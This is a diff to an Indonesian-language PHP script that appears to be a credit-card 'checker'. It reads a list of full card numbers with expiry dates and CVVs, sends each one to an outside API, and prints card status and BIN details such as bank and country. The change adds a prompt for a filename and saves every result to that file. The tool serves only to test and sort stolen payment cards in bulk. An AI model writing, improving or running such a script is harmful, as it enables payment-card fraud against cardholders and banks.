@@ -6,6 +6,8 @@ echo "  )(  ) __ ( ) _) \___ \ )( /    //    / ) _)  )   /\___ \ \n";
 echo " (__) \_)(_/(____)(____/(__)\_)__)\_)__)(____)(__\_)(____/ \n";
 echo "[?] Masukan List (.txt) 40002xxxxxxxxxxx|xx|xx|xxx : ";
 $file = file(trim(fgets(STDIN)));
+echo "[?] Nama Saved (*.txt) : ";
+$namafile = trim(fgets(STDIN));
 foreach ($file as $list => $data) {
 $urls = trim($data);
 $url = "https://bintangmuliapropertindo.com/api/api_cc.php?data=$urls";
@@ -36,6 +38,7 @@ $code = $json->error;
 $data = $json->data;
 $info = $json->data->bins;
 print_r($data->msg.'-'.$data->cc.'-'.$info->scheme.'-'.$info->type.'-'.$info->brand.'-'.$info->bank.'-'.$info->country."\n");
+fwrite(fopen("$namafile", "a"), $data->msg.'-'.$data->cc.'-'.$info->scheme.'-'.$info->type.'-'.$info->brand.'-'.$info->bank.'-'.$info->country."\n");
 }
 
  ?>
